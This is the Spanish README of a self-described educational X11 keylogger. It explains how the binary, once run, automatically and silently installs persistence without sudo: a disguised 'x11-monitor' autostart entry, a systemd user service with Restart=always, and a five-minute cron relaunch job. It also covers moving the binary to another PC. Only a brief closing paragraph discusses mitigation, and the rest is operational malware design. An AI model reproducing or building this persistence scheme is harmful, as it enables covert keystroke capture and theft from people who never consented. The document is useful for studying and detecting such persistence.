# Persistencia Automática - X11 Keylogger Educativo

## Resumen

La persistencia se **instala automáticamente** cuando ejecutas el keylogger. No requiere `sudo` ni banderas especiales. El sistema es **completamente portable**: el binario funciona en cualquier PC, y los mecanismos de persistencia se adaptan a la ruta donde esté ubicado.

## Cómo funciona

### 1. **Resolución automática de ruta**
Cuando inicias `./x11_keylogger` (desde cualquier ubicación):
- La función `resolve_binary_path(argv[0], ...)` convierte la ruta relativa/absoluta a ruta absoluta
- Ejemplo: `./x11_keylogger` → `/home/user/Desktop/x11_keylogger`
- Esta ruta se almacena en `g_binary_path` para uso en persistencia

### 2. **Thread automático de instalación**
Al iniciar el keylogger:
- En segundo plano (sin bloquear), un thread invoca `persistence_install_thread()`
- Espera 2 segundos para asegurar que el proceso principal está inicializado
- Intenta instalar 3 mecanismos de persistencia **sin elevar privilegios**

### 3. **Tres mecanismos de persistencia**

#### **A. Desktop Entry** (`~/.config/autostart/x11-monitor.desktop`)
- ✅ Se ejecuta al iniciar sesión X11
- ✅ Compatible con GNOME, KDE, XFCE
- ✅ No requiere permisos especiales

#### **B. Systemd User Service** (`~/.config/systemd/user/x11-monitor.service`)
- ✅ Se ejecuta cuando inicia la sesión gráfica
- ✅ Reinicia automáticamente si se detiene (`Restart=always`)
- ✅ Activado con `systemctl --user enable` (no requiere sudo)

#### **C. Cron Job** (`crontab -l`)
- ✅ Ejecuta cada 5 minutos: `*/5 * * * *`
- ✅ Verifica si el proceso está activo
- ✅ Lo reinicia si fue detenido
- ✅ Último recurso si fallan los otros dos

## Verificación de persistencia

Después de ejecutar el keylogger, puedes verificar qué se instaló:

```bash
# Ver si el archivo .desktop existe
cat ~/.config/autostart/x11-monitor.desktop

# Ver si el servicio systemd está habilitado
systemctl --user list-unit-files | grep x11-monitor
systemctl --user status x11-monitor.service

# Ver si está en cron
crontab -l

# Ver log de instalación (para debugging)
cat /tmp/x11_persist_install.log
```

## Log de debugging

Cuando se ejecuta, se genera `/tmp/x11_persist_install.log` con detalles:

```
[1704638400] === Instalando persistencia ===
[1704638400] Binary path: /home/user/Desktop/x11_keylogger
[1704638402] Desktop Entry (.desktop): OK
[1704638402] Systemd User Service: OK
[1704638402] Cron Job (verificación cada 5min): OK
[1704638402] === Resultado: 3/3 mecanismos exitosos ===
```

## Portabilidad entre PCs

**Escenario:** Compilas en PC1, copias el binario a PC2

1. En PC1: `gcc -o x11_keylogger src/x11_keylogger.c ...`
2. Copias a PC2: `scp x11_keylogger user@pc2:/home/user/`
3. En PC2: `./x11_keylogger`
   - La ruta se resuelve como `/home/user/x11_keylogger`
   - Los mecanismos apuntan a esta ruta (no la de PC1)
   - **Persistencia funciona correctamente**

## Instalación manual

Si prefieres instalar manualmente o verificar que se instaló:

```bash
# Instalar explícitamente (ejecuta el bloque if)
./x11_keylogger --install-persist

# Esto mostrará:
# [✓] Desktop entry instalado (~/.config/autostart/x11-monitor.desktop)
# [✓] Systemd service instalado (~/.config/systemd/user/x11-monitor.service)
# [✓] Cron job instalado
# [+] Persistencia instalada exitosamente
```

## Sin privilegios elevados (sudo)

- ✅ No requiere `sudo` en ningún paso
- ✅ Solo accede a `~/.config/` (tu home)
- ✅ Solo modifica tu `crontab` (del usuario actual)
- ✅ Incompatible con `/usr/local/bin` sin `sudo`, pero completamente portable en directorios del usuario

## Limitaciones y notas

1. **Permisos:** La persistencia solo funciona para el usuario que ejecuta el keylogger
   - Si ejecutas como `user1`, la persistencia se instala para `user1`
   - Otros usuarios no ejecutarán el keylogger

2. **Reinicio de PC:**
   - Desktop Entry + Systemd → Se ejecuta al login
   - Cron → Se ejecuta cada 5 minutos (fallback si los otros fallan)

3. **Desactivación:**
   ```bash
   # Borrar permanentemente
   rm ~/.config/autostart/x11-monitor.desktop
   systemctl --user disable x11-monitor.service
   crontab -e  # eliminar manualmente la línea del keylogger
   ```

4. **Debugging:** Revisa `/tmp/x11_persist_install.log` si algo no funciona
   - Verifica permisos en `~/.config/`
   - Revisa `journalctl --user -u x11-monitor.service` para errores de systemd
   - Verifica con `crontab -l` que el comando esté ahí

## Arquitectura técnica

```
main()
  ├─ resolve_binary_path(argv[0])  → g_binary_path = "/path/to/binary"
  ├─ start_keylogger()
  │   └─ pthread_create(persistence_install_thread)
  │       ├─ sleep(2)  → espera a que el keylogger se estabilice
  │       ├─ install_autostart_entry(g_binary_path)
  │       ├─ install_systemd_service(g_binary_path)
  │       ├─ install_cron_job(g_binary_path)
  │       └─ log a /tmp/x11_persist_install.log
  │
  └─ Captura de eventos XRecord (main loop)
```

Todos los pasos de persistencia ocurren **en paralelo** sin bloquear la captura de eventos.

---

**Nota educativa:** Este sistema demuestra cómo un malware portátil podría persistir en un sistema sin requerir privilegios elevados. En entornos reales, se mitiga mediante:
- Monitoreo de `crontab` y `systemd` user services
- Protección de `~/.config/autostart`
- Auditoría de procesos en segundo plano
